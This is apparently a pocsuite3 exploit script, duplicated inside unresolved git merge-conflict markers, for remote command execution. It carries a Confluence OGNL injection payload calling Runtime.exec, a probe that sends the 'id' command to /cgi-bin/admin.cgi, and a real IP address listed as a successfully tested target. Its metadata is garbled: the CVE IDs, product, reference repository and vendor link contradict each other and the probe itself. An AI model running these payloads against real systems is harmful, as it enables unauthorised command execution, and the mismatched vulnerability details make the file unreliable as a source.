<<<<<<< HEAD
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class CVE_2021_46422_POC(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "CVE-2022-26134"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "TOM"  # PoC作者的大名
    vulDate = "2022-07-09"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-01-13"  # 编写 PoC 的日期
    updateDate = "2022-01-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/xuxueli/xxl-job.git"]  # 漏洞地址来源,0day不用写
    name = "CVE-2022-26134"  # PoC 名称
    appPowerLink = "https://www.drupal.org/"  # 漏洞厂商主页地址
    appName = "ATLASSIAN-Confluence"  # 漏洞应用名称
    appVersion = "全版本"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["https://106.52.3.78 "]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = [requests]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """ATLASSIAN-Confluence存在远程命令执行漏洞"""  # 漏洞简要描述
    pocDesc = """/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/","""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9",
                   "If-None-Match": "\"-854243114\"", "If-Modified-Since": "Mon, 24 Aug 2015 05:39:39 GMT",
                   "Connection": "close"}
        result = []
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            url = self.url.strip() + "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id"  # self.url 就是你指定的-u 参数的值
            response = requests.get(url=url, headers=headers, allow_redirects=False, verify=False,
                                     timeout=5)
            if "uid" in response.text:
                result.append(self.url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(CVE_2021_46422_POC)
=======
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class CVE_2021_46422_POC(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "CVE-2022-26134"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "TOM"  # PoC作者的大名
    vulDate = "2022-07-09"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-01-13"  # 编写 PoC 的日期
    updateDate = "2022-01-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/xuxueli/xxl-job.git"]  # 漏洞地址来源,0day不用写
    name = "CVE-2022-26134"  # PoC 名称
    appPowerLink = "https://www.drupal.org/"  # 漏洞厂商主页地址
    appName = "ATLASSIAN-Confluence"  # 漏洞应用名称
    appVersion = "全版本"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["https://106.52.3.78 "]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = [requests]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """ATLASSIAN-Confluence存在远程命令执行漏洞"""  # 漏洞简要描述
    pocDesc = """/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/","""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9",
                   "If-None-Match": "\"-854243114\"", "If-Modified-Since": "Mon, 24 Aug 2015 05:39:39 GMT",
                   "Connection": "close"}
        result = []
        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            url = self.url.strip() + "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id"  # self.url 就是你指定的-u 参数的值
            response = requests.get(url=url, headers=headers, allow_redirects=False, verify=False,
                                     timeout=5)
            if "uid" in response.text:
                result.append(self.url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(CVE_2021_46422_POC)
>>>>>>> 079ba1ffb5cb73edffc8aed244d44e390fe6a05b
